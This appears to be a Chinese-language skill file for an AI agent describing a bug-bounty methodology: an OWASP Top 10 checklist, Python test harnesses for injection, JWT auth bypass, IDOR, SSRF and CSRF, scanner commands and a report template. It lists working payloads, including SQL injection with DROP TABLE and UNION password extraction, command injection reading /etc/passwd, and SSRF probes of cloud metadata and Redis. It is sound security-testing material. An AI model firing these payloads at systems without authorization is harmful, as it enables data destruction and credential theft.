---
name: security-bounty-hunter
type: capability
package: security-advanced
description: 系统化漏洞挖掘方法论，涵盖 OWASP Top 10 检查、注入测试、认证绕过、授权缺陷、SSRF/CSRF 检测、依赖漏洞扫描与报告格式。
---

# 安全漏洞挖掘方法论

## 核心原则

1. **系统化** — 按清单逐项检查，不依赖灵感和运气
2. **攻击者视角** — 思考"如何绕过"而非"是否实现了"
3. **深度优先** — 发现一个入口后深入挖掘，而非浅尝辄止
4. **证据驱动** — 每个发现都有可复现的 PoC
5. **负责任披露** — 发现漏洞后按流程报告，不扩大影响

## OWASP Top 10 检查清单

```
A01: 访问控制失效
├── 水平越权：用户 A 能访问用户 B 的数据？
├── 垂直越权：普通用户能访问管理员功能？
├── IDOR：可预测的资源 ID 是否有权限校验？
├── 目录遍历：../../../etc/passwd 是否可访问？
└── CORS 配置：是否允许任意源？

A02: 加密失败
├── 敏感数据是否明文传输（HTTP）？
├── 密码是否使用强哈希（bcrypt/argon2）？
├── 密钥是否硬编码在源码中？
└── TLS 版本是否 ≥ 1.2？

A03: 注入
├── SQL 注入（参数化查询？）
├── NoSQL 注入（MongoDB 操作符注入？）
├── OS 命令注入（用户输入拼接命令？）
├── LDAP 注入
└── 模板注入（SSTI）

A04: 不安全设计
├── 业务逻辑缺陷（负数金额？重复提交？）
├── 竞态条件（并发请求绕过限制？）
└── 缺少速率限制的敏感操作

A05: 安全配置错误
├── 默认凭据未修改？
├── 错误信息暴露堆栈/路径？
├── 不必要的端口/服务开放？
└── 调试模式在生产环境开启？

A07: 身份认证失败
├── 暴力破解保护（账户锁定/限流）？
├── 弱密码策略？
├── Session 固定攻击？
├── Token 过期和撤销机制？
└── 密码重置流程安全？

A08: 软件和数据完整性失败
├── 依赖是否有已知漏洞？
├── CI/CD 管道是否可被篡改？
└── 反序列化是否安全？

A10: SSRF（服务端请求伪造）
├── 用户可控的 URL 是否有白名单？
├── 内网地址是否可访问（127.0.0.1, 169.254.x.x）？
└── DNS 重绑定攻击？
```

## 注入测试

```python
# SQL 注入测试向量
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "' UNION SELECT null, username, password FROM users --",
    "1; WAITFOR DELAY '0:0:5' --",  # 时间盲注
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
]

# 测试方法
async def test_sql_injection(endpoint: str, param: str):
    """对指定端点的参数进行 SQL 注入测试"""
    for payload in sql_payloads:
        response = await client.get(endpoint, params={param: payload})

        # 检测指标
        indicators = {
            "error_based": any(kw in response.text.lower() for kw in
                ["sql", "syntax", "mysql", "postgresql", "sqlite"]),
            "boolean_based": response.status_code == 200,  # 对比正常响应
            "time_based": response.elapsed.total_seconds() > 4,
        }

        if any(indicators.values()):
            report_finding("SQL Injection", endpoint, param, payload, indicators)

# XSS 测试向量
xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "javascript:alert(1)",
    "{{7*7}}",  # 模板注入
    "${7*7}",   # 表达式注入
]

# 命令注入测试
cmd_payloads = [
    "; id",
    "| cat /etc/passwd",
    "$(whoami)",
    "`whoami`",
    "\n/bin/sh",
]
```

## 认证绕过测试

```python
async def test_auth_bypass(base_url: str):
    """认证绕过测试套件"""

    # 1. 无 Token 访问受保护端点
    r = await client.get(f"{base_url}/api/admin/users")
    assert r.status_code == 401, "未认证应返回 401"

    # 2. 过期 Token
    expired_token = generate_jwt(exp=datetime.now() - timedelta(hours=1))
    r = await client.get(f"{base_url}/api/me",
                         headers={"Authorization": f"Bearer {expired_token}"})
    assert r.status_code == 401, "过期 Token 应被拒绝"

    # 3. 篡改 Token（修改 user_id）
    tampered_token = tamper_jwt_payload(valid_token, {"user_id": "admin"})
    r = await client.get(f"{base_url}/api/me",
                         headers={"Authorization": f"Bearer {tampered_token}"})
    assert r.status_code == 401, "篡改 Token 应被拒绝"

    # 4. 算法混淆攻击（alg: none）
    none_token = create_jwt_with_alg_none({"user_id": "admin"})
    r = await client.get(f"{base_url}/api/me",
                         headers={"Authorization": f"Bearer {none_token}"})
    assert r.status_code == 401, "alg:none Token 应被拒绝"

    # 5. 密码重置 Token 复用
    reset_token = await request_password_reset("victim@example.com")
    await reset_password(reset_token, "new_password")
    # 尝试再次使用同一 Token
    r = await reset_password(reset_token, "another_password")
    assert r.status_code in [400, 401], "重置 Token 应一次性使用"
```

## 授权缺陷（IDOR）

```python
async def test_idor(base_url: str, user_a_token: str, user_b_token: str):
    """水平越权测试"""

    # 用户 A 创建资源
    r = await client.post(f"{base_url}/api/orders",
                          headers=auth_header(user_a_token),
                          json={"item": "test", "amount": 100})
    order_id = r.json()["id"]

    # 用户 B 尝试访问用户 A 的资源
    r = await client.get(f"{base_url}/api/orders/{order_id}",
                         headers=auth_header(user_b_token))
    assert r.status_code == 403, f"IDOR 漏洞：用户 B 可访问用户 A 的订单 {order_id}"

    # 用户 B 尝试修改用户 A 的资源
    r = await client.put(f"{base_url}/api/orders/{order_id}",
                         headers=auth_header(user_b_token),
                         json={"status": "cancelled"})
    assert r.status_code == 403, f"IDOR 漏洞：用户 B 可修改用户 A 的订单"

    # 遍历 ID 测试
    for test_id in range(1, 100):
        r = await client.get(f"{base_url}/api/users/{test_id}",
                             headers=auth_header(user_b_token))
        if r.status_code == 200 and r.json()["id"] != user_b_id:
            report_finding("IDOR", f"/api/users/{test_id}")
```

## SSRF/CSRF 检测

```python
# SSRF 测试
async def test_ssrf(endpoint: str, url_param: str):
    """SSRF 测试：检查是否可访问内网资源"""
    ssrf_payloads = [
        "http://127.0.0.1:80",
        "http://localhost:22",
        "http://169.254.169.254/latest/meta-data/",  # AWS 元数据
        "http://[::1]:80",
        "http://0x7f000001",  # 十六进制 IP
        "http://2130706433",  # 十进制 IP
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",  # Redis
    ]

    for payload in ssrf_payloads:
        r = await client.post(endpoint, json={url_param: payload})
        if r.status_code == 200 and len(r.content) > 0:
            report_finding("SSRF", endpoint, url_param, payload)

# CSRF 测试
async def test_csrf(endpoint: str, method: str = "POST"):
    """CSRF 测试：检查状态变更操作是否有 CSRF 保护"""
    # 不带 CSRF Token 的请求
    r = await client.request(method, endpoint,
                             json={"action": "delete_account"},
                             headers={"Origin": "https://evil.com"})

    if r.status_code < 400:
        report_finding("CSRF", endpoint,
                      detail="状态变更操作缺少 CSRF 保护")
```

## 依赖漏洞扫描

```bash
# npm/pnpm 项目
npx audit-ci --critical
pnpm audit --audit-level=high

# Python 项目
pip-audit --strict --desc
safety check --full-report

# Go 项目
govulncheck ./...

# 容器镜像
trivy image myapp:latest --severity HIGH,CRITICAL

# 通用工具
snyk test --severity-threshold=high
```

## 报告格式

```markdown
# 安全漏洞报告

## 摘要
| 字段 | 值 |
|------|-----|
| 标题 | 订单 API 存在 IDOR 漏洞 |
| 严重程度 | High (CVSS 7.5) |
| 影响范围 | 所有已认证用户 |
| 发现日期 | 2024-03-15 |
| 状态 | 待修复 |

## 漏洞描述
`GET /api/orders/:id` 端点未验证请求用户是否为订单所有者，
任何已认证用户可通过遍历 ID 访问其他用户的订单详情。

## 复现步骤
1. 以用户 A 身份登录，获取 Token
2. 创建订单，记录订单 ID（如 order_123）
3. 以用户 B 身份登录
4. 请求 `GET /api/orders/order_123`（使用用户 B 的 Token）
5. 观察：返回 200 和用户 A 的订单详情

## PoC
```bash
curl -H "Authorization: Bearer <user_b_token>" \
     https://api.example.com/api/orders/order_123
```

## 影响
- 用户隐私数据泄露（订单金额、收货地址、商品信息）
- 影响所有用户（约 50,000 活跃用户）

## 修复建议
在 OrderController.getById() 中添加所有权验证：
```typescript
if (order.userId !== req.user.id) {
  throw new ForbiddenException();
}
```

## 参考
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP: Insecure Direct Object References
```

## 检查清单

- [ ] OWASP Top 10 逐项检查完成
- [ ] 所有用户输入点测试注入（SQL、XSS、命令、模板）
- [ ] 认证机制测试：过期 Token、篡改、算法混淆
- [ ] 授权测试：水平越权（IDOR）和垂直越权
- [ ] SSRF 测试：内网地址、云元数据、协议切换
- [ ] CSRF 测试：所有状态变更操作有保护
- [ ] 依赖漏洞扫描：无 High/Critical 未修复漏洞
- [ ] 业务逻辑测试：竞态条件、负数金额、重复提交
- [ ] 每个发现有可复现的 PoC 和修复建议
- [ ] 报告按 CVSS 评分排序，优先修复高危漏洞
